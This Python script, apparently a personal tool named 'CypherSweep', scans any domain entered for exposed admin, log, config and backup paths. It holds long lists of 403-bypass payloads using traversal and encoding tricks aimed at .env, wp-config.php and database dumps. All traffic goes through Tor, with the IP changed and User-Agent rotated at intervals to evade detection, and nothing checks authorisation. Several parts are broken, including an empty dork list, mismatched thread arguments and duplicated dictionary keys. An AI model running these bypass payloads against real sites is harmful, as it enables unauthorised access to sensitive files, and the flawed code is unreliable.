import requests
import threading
import random
import multiprocessing
import re
import time
import os
import subprocess
from stem import Signal
from stem.control import Controller
from pyfiglet import figlet_format
from termcolor import colored

TOR_PATH = os.path.join(os.path.dirname(__file__), "Torfolder", "tor", "tor.exe")
torrc_path = os.path.join(os.path.dirname(__file__), "Torfolder", "torrc.txt",)




dorks = [] # will be filled with dorks stored as tuples with the prefix first then the postfix being second in the pair dorks that dont have a post fix will have " " as the second pair 
fuzz = [("/","/?"),("//","//"),("///","///"),("/./","/./"),("/","?"),("/","??"),("/","/?/"),("/","/??"),("/","/??/"),("/","/.."),("/","/../"),
        ("/","/./"),("/","/."),("/","/.//"),("/","/*"),("/","//*"),("/","/%2f"),("/","/%2f/"),("/","/%20"),("/","/%20/"),("/","/%09"),("/","/%09/"),
        ("/","/%0a"),("/","/%0a/"),("/","/%0d"),("/","/%0d/"),("/","/%25"),("/","/%25/"),("/","/%23"),("/","/%23"),("/","/%26"),("/","/%3f"),("/","/%3f/"),
        ("/","/%26/"),("/","/#"),("/","/#/"),("/","/#/./"),("/./",""),("/./","/"),("/..;/",""),("/..;/","/"),("/.;/",""),("/.;/","/"),("/;/",""),
        "/;/admin/","//;//admin","//;//admin/","/admin/./","/%2e/admin","/%2e/admin/","/%20/admin/%20","/%20/admin/%20/","/admin/..;/","/admin.json",
        "/admin/.json","/admin..;/","/admin;/","/admin%00","/admin.css","/admin.html","/admin?id=1","/admin~","/admin/~","/admin/°/","/admin/&",
        "/admin/-","/admin\\/\\/","/admin/..%3B/","/admin/;%2f..%2f..%2f","/admin/..\\;/","/*/admin","/*/admin/","/ADMIN","/ADMIN/","/ADM+IN","/ADM+IN/"] # convert to tuples

proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

bypass_payloads = {
    "admin": [
        "//admin//", "///admin///", "/admin//login", "/admin///index",
        "/./admin/", "/admin/./login", "/admin/../admin/", "/././admin", "/admin/../../admin", "/admin/..;/", "/admin//../",
        "/%2e/admin/", "/admin%2f", "/admin%2e%2e/", "/%2e%2e/admin", "/admin%00", "/admin%09", "/admin\\/\\/", "/admin/%2e%2e/", "/%2e/admin%2e%2e",
        "/admin%20", "/admin%09", "/admin%0a", "/admin%0d", "/admin%25", "/admin%3f", "/admin%26", "/admin;%2f..%2f..%2f", "/..%3b/admin", "/admin;%00", "/admin/%00/",
        "/ADMIN", "/AdMiN", "/Adm%49n", "/admIN/", "/ADM+IN", "/admin~", "/admin/~", "/admin/°/", "/Admin./",
        "/admin.css", "/admin.html", "/admin.json", "/admin/.json", "/admin.php", "/admin.bak", "/admin.old", "/admin.inc", "/admin.asp", "/admin.aspx",
        "/admin?id=1", "/admin.php?debug=true", "/admin?access=granted", "/admin#", "/admin?redirect=/login", "/admin?.css", "/admin?user=admin&pass=admin",
        "/..;/admin", "/admin..;/", "/%2e%2e%2fadmin", "/%2e%2e/admin", "/%2e%2e/%2e%2e/admin", "/%252e%252e/%252e%252e/admin"
    ],

    "log": [
        "//logs//", "///logs///", "/log//", "/log///debug",
        "/./logs/", "/logs/./error", "/logs/../", "/././log", "/logs/../../", "/logs/..;/", "/logs//../",
        "/%2e/logs/", "/logs%2f", "/logs%2e%2e/", "/%2e%2e/logs", "/logs%00", "/logs%09", "/logs\\/\\/", "/logs/%2e%2e/", "/%2e/logs%2e%2e",
        "/logs%20", "/logs%09", "/logs%0a", "/logs%0d", "/logs%25", "/logs%3f", "/logs%26", "/logs;%2f..%2f..%2f", "/..%3b/logs", "/logs;%00", "/logs/%00/",
        "/LOGS", "/LoGs", "/Lo%47s", "/LOG+S", "/log~", "/logs/~", "/logs/°/", "/Logs./",
        "/error.log", "/access.log", "/debug.log", "/logs.php", "/logs.json", "/logs.txt", "/logs.tar.gz", "/logfile.bak",
        "/logs?type=debug", "/logs?download=1", "/logs?id=1", "/logs.php?dump=1", "/logs?.log", "/logs?user=admin&debug=true",
        "/..;/logs", "/logs..;/", "/%2e%2e%2flogs", "/%2e%2e/logs", "/%2e%2e/%2e%2e/logs", "/%252e%252e/%252e%252e/logs"
    ],

    "config": [
        "//config//", "///config///", "/config//settings", "/config///hidden",
        "/./config/", "/config/./", "/config/../", "/././config", "/config/../../", "/config/..;/", "/config//../",
        "/%2e/config/", "/config%2f", "/config%2e%2e/", "/%2e%2e/config", "/config%00", "/config%09", "/config\\/\\/", "/config/%2e%2e/", "/%2e/config%2e%2e",
        "/config%20", "/config%09", "/config%0a", "/config%0d", "/config%25", "/config%3f", "/config%26", "/config;%2f..%2f..%2f", "/..%3b/config", "/config;%00", "/config/%00/",
        "/CONFIG", "/ConfIg", "/CONF+IG", "/con%66ig", "/config~", "/config/~", "/config/°/", "/Config./",
        "/config.php", "/config.json", "/config.yaml", "/config.ini", "/config.xml", "/.env", "/wp-config.php", "/conf/settings.conf", "/config.bak",
        "/config?id=1", "/config?download=1", "/config?.json", "/config.php?debug=true",
        "/..;/config", "/config..;/", "/%2e%2e%2fconfig", "/%2e%2e/config", "/%2e%2e/%2e%2e/config", "/%252e%252e/%252e%252e/config"
    ],

    "backup": [
        "//backup//", "///backup///", "/backup//2023", "/backup///db",
        "/./backup/", "/backup/./", "/backup/../", "/././backup", "/backup/../../", "/backup/..;/", "/backup//../",
        "/%2e/backup/", "/backup%2f", "/backup%2e%2e/", "/%2e%2e/backup", "/backup%00", "/backup%09", "/backup\\/\\/", "/backup/%2e%2e/", "/%2e/backup%2e%2e",
        "/backup%20", "/backup%09", "/backup%0a", "/backup%0d", "/backup%25", "/backup%3f", "/backup%26", "/backup;%2f..%2f..%2f", "/..%3b/backup", "/backup;%00", "/backup/%00/",
        "/BACKUP", "/BackUp", "/BA+KUP", "/ba%63kup", "/backup~", "/backup/~", "/backup/°/", "/Backup./",
        "/backup.zip", "/backup.tar.gz", "/db_backup.sql", "/site_backup.sql", "/database_backup.bak", "/backup.json", "/backup.ini", "/backup.old", "/backup.bak", "/.backup",
        "/backup?id=1", "/backup?dl=1", "/backup.php?view=true", "/backup?.zip", "/backup?file=latest.sql",
        "/..;/backup", "/backup..;/", "/%2e%2e%2fbackup", "/%2e%2e/backup", "/%2e%2e/%2e%2e/backup", "/%252e%252e/%252e%252e/backup"
    ]
}

headers = [{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/110.0"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Linux; U; Android 12; en-us; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:110.0) Gecko/20100101 Firefox/110.0"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi Note 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/109.0"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.0 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.4 Mobile/15E148 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/109.0.0.0 Safari/537.36"}] 
vulnerable = []
tried = set()
threadsmain = []
fuzzvuln = []
threadsfuzz = []
stop_event = threading.Event()
flagwords = {"(Exposed directory)" :"Index of /", "(Exposed directory)" : "Directory listing for", "(Exposed directory)" :"Parent Directory", "(Exposed directory)" :".htaccess",
            "(Exposed directory)" : "server-status", "(Linux password file)" : "root:x:0:0:", " (Windows boot file)" : "boot.ini" ,
            "(Environment configuration file)" : ".env", "(Possible DB credentials)": "config.php", "(Exposed version control meta data)" : ".git",
            "(Java app server config)" : "WEB-INF/web.xml", "(ASP.NET configuration)" : "appsettings.json", "(Django settings file)" : "local_settings.py",
            "(Exposed admin endpoint)" : "/admin", "(Exposed admin endpoint)" : "/phpmyadmin", "(Exposed admin endpoint)" : "/wp-admin", "(Exposed debug endpoint)" : "/debug",
            "(Exposed debug endpoint)" : "/dev", "(Exposed debug endpoint)" : "/config", "(Exposed debug endpoint)" : "/logs"}
fuzztried = set()
pattern = r"^(?:[a-zA-Z0-9-]{1,63}\.)+[a-zA-Z]{2,10}(?:$|\/)"
lock = threading.Lock()
n = multiprocessing.cpu_count()
range1 = 50
range2 = 70


def change_ip():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)  # Send NEWNYM signal to change the IP

def displayprogress(tried, pool, threads_list):
    while any(thread.is_alive() for thread in threads_list):
        if len(pool) > 0:
            progress = (len(tried) / len(pool)) * 100
            print(f"Task progress {progress:.2f}% ")
        else:
            print("Waiting for tasks...")
        time.sleep(5)
    print("All threads completed!")

def flagcatch(r,b):
    for key, value in flagwords.items():  
        if value.encode() in r.content:  
            with lock:
                b[key] = r.url + " | " + value              

def Vulnsearch():
    global threadsmain
    stop_event.clear() # Reset the flag at the start
    threadsmain = []
    tried = set()
    flagscaught = {}
    target = input("ENTER A DOMAIN: ")
    if bool(re.match(pattern, target)):
        inputval = "https://" + target

        try:
            requests.get(inputval, proxies=proxies, headers=headers[random.randint(0,len(headers) - 1)])
        except requests.exceptions.RequestException as e:
            print("could not resolve domain try again")
            return Vulnsearch()
        threadcount = n
    else:
        print("Invalid domain please try again")
        return Vulnsearch()
    def task(target,flagscaught,tried):
        global stop_event
        reqcount = 0
        rm = random.randint(range1,range2)
        rh = random.randint(0, len(headers)-1)
        for i in range(len(dorks)):
            if stop_event.is_set():
                return

            URL = "https://" + dorks[i][0] + target + dorks[i][1] + dorks[i][2]

            try:            
                s = requests.get(URL, headers=headers[rh], proxies=proxies)
                reqcount += 1
                if s.status_code in [202,200,302]:
                    with lock:
                            vulnerable.append("https://" + dorks[i][0] + target + dorks[i][1] + dorks[i][2])
                    flagcatch(s,flagscaught)
                elif s.status_code == 403:
                    try:
                        for payload_list in bypass_payloads.values():
                            for payload in payload_list:
                                req = "https://" + target + payload
                                r = requests.get(req, headers=headers[rh], proxies=proxies)
                                reqcount += 1 

                                if r.status_code in [202,200,302]:
                                    with lock:
                                        vulnerable.append(req)
                                    flagcatch(r,flagscaught)
                    except requests.exceptions.RequestException as e:
                        print(f"403 fuzz Request Connection error: {e}")
                        stop_event.set()
                        mainmenu()
            except (KeyboardInterrupt, requests.exceptions.RequestException) as e:
                print(f"Request failed or interrupted for {URL}: {e}")
                stop_event.set()
                mainmenu()
                if reqcount >= rm:
                    reqcount = 0
                    change_ip()
                    rh = random.randint(0, len(headers)-1)
                    rm = random.randint(range1,range2)


    for i in range(threadcount):
        thread = threading.Thread(target=task, args=(target,flagscaught))
        thread.start()
        with lock:
            threadsmain.append(thread)

    progress_thread = threading.Thread(target=displayprogress, args=(tried, dorks, threadsmain))
    progress_thread.daemon = True
    progress_thread.start()

    for thread in threadsmain:
        thread.join()



    print(f"Vulnerable URL's: {vulnerable}")
    print(f"Other flagged Vulns: {flagscaught}")




def bypass():
    global threadsfuzz
    stop_event.clear()
    flagscaught = {}
    threadsfuzz = []
    fuzztried = []
    target = input("ENTER 403 DOMAIN: ")
    if bool(re.match(pattern, target)):
        inputval = "https://" + target
        try:
            iv = requests.get(inputval, proxies=proxies, headers=headers[random.randint(0,len(headers) - 1)])
        except requests.exceptions.RequestException as e:
            print("could not resolve domain try again")
            return bypass()
        
        threadcount = n
    else:
        print("Invalid domain please try again")
        return bypass()
    def task2(target,flagscaught):
        global stop_event
        reqcount = 0
        change_ip()
        lastslash = 0
        for i in range(len(target)):
            if target[i] == "/":
                lastslash = i
        if lastslash == 5 or lastslash == 6:
            lastslash = 7
        core = target[lastslash + 1:len(target)]
        rh = random.randint(0, len(headers)-1)
        rm = random.randint(range1, range2)
        for i in range(len(fuzz)):
            if stop_event.is_set():
                return
            if fuzz[i] not in fuzztried:
                with lock:
                    fuzztried.append(fuzz[i])
                if i == len(fuzz) - 4 or i == len(fuzz) - 3:
                    fuzzatt = "https://" + fuzz[i][0] + core.upper() + fuzz[i][1]
                elif i == len(fuzz) - 2 or i == len(fuzz) - 1:
                    coreup = core.upper()
                    fuzzatt = "https://" + fuzz[i][0] + coreup[0:(len(coreup) - 1) // 2] + "+" + coreup[(len(coreup) - 1) // 2: len(coreup)] + fuzz[i][1]
                else:
                    fuzzatt = "https://" + fuzz[i][0] + core + fuzz[i][1]
                try:
                    ff = requests.get(fuzzatt, headers=headers[rh], proxies=proxies)
                    reqcount +=1 
                    if ff.status_code in [202,200,302]:
                        with lock:
                            vulnerable.append(fuzzatt)
                        flagcatch(ff,flagscaught)
                except (KeyboardInterrupt, requests.exceptions.RequestException) as e:
                    print(f"403 fuzz attempt failed: {e}")
                    stop_event.set()
                    mainmenu()
                if reqcount >= rm:
                    reqcount = 0
                    change_ip()
                    rh = random.randint(0, len(headers)-1)
                    rm = random.randint(range1, range2)

             
    for i in range(threadcount):
        thread = threading.Thread(target=task2, args=(target,flagscaught))
        thread.start()
        with lock:
            threadsfuzz.append(thread)

    progress_thread = threading.Thread(target=displayprogress, args=(fuzztried, fuzz, threadsfuzz))
    progress_thread.daemon = True
    progress_thread.start()

    for thread in threadsfuzz:
        thread.join()
    

    print(f"Vulnerable URL's: {vulnerable}")
    print(f"Other flagged Vulns: {flagscaught}")
    


def responseanalyze():
    flagscaught = {}
    target = input("ENTER DOMAIN: ")
    count = 0
    if bool(re.match(pattern, target)):
        inputval = "https://" + target
        try:
            iv = requests.get(inputval, proxies=proxies, headers=headers[random.randint(0,len(headers) - 1)])
        except requests.exceptions.RequestException as e:
            print("could not resolve domain try again")
            responseanalyze()
    else:
        print("Invalid domain please try again")
        responseanalyze()
    try:
        for key, value in flagwords.items():
            count +=1  
            if value.encode() in iv.content:  
                    progress = (count // len(flagwords)) * 100
                    if count % 5 == 0:
                        print(f"Scan progress {progress}%")

                    flagscaught[key] = iv.url + " | " + value
    except(KeyboardInterrupt, requests.exceptions.RequestException):
        print("Keyboard interrupt returning to menu")
        mainmenu


    print(f"Flagged vulnerabilities: {flagscaught}")




def helpmenu():
    print("-----------------------------------------------------------------------------------------------------------------------------------------------------------------")
    print("                                                                                                                                               By Michael Ajilore")
    ascii_art = figlet_format("CypherSweep", font="slant")

    print(colored(ascii_art, "yellow"))
    print("Option 1 to start Vulnerability search")
    print("Option 2 to start 403 Bypass")
    print("Option 3 to analyze HTTP response")
    print("Option 4 for help menu")
    print("Option 5 for settings")
    print(" ")
    print("Use Crtl + C to back out of any scan")
    print("Please ensure your device has nothing running on port 9050 or 9051 ")
    print("-----------------------------------------------------------------------------------------------------------------------------------------------------------------")
    x = int(input("choose any number to return to main menu: "))
    if x >= 0:
        mainmenu()

def mainmenu():
    print("-----------------------------------------------------------------------------------------------------------------------------------------------------------------")
    print("                                                                                                                                               By Michael Ajilore")
    ascii_art = figlet_format("CypherSweep", font="slant")
    print(colored(ascii_art, "yellow"))
    print("(1) Vulnerability Search")
    print("(2) 403 Bypass")
    print("(3) Scan HTTP response")
    print("(4) Help menu                                                                                                   This war's a people's war against a system that's")
    print("(5) Settings                                                                                                    spiralled outta our control                      ")
    print("-----------------------------------------------------------------------------------------------------------------------------------------------------------------")
    user = int(input())

    if user == 1:
        Vulnsearch()
    elif user == 2:
        bypass()
    elif user == 3:
        responseanalyze()
    elif user == 4:
        helpmenu()
    elif user == 5:
        Settings()
    else:
        mainmenu()

def Settings():
    print("-----------------------------------------------------------------------------------------------------------------------------------------------------------------")
    print(" ")
    print("(1) Set Thread Count")
    print("(2) Set Rate limiting")
    print("(3) Main menu")
    print(" ")
    print("-----------------------------------------------------------------------------------------------------------------------------------------------------------------")
    q = int(input())
    if q == 1:
        threadcont()
    elif q == 2:
        ratelimitcont()
    elif q == 3:
        mainmenu()
    

def threadcont():
    global n
    i = int(input("Enter 1 for set threads | Enter 2 to optimize threads to your system :"))
    if i == 1:
        k = input("enter desired thread count :")
        n = k
    elif i == 2:
        n = multiprocessing.cpu_count
    return mainmenu()

def ratelimitcont():
    global range1 , range2
    i = int(input("Enter 1 to set rate limit range | Enter 2 for suggested range :"))
    if i == 1:
        k = input("Enter desired range (e.g., 50 70): ")
        try:
            range1, range2 = map(int, k.split(" "))
        except ValueError:
            print("Invalid input. Please enter two numbers separated by a space.")
            return ratelimitcont()


    elif i == 2:
        range1 = 50
        range2 = 70
    return mainmenu()


print("Loading please wait")

tor_process = subprocess.Popen(
    [TOR_PATH, "-f", torrc_path],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

time.sleep(5)
change_ip()
mainmenu()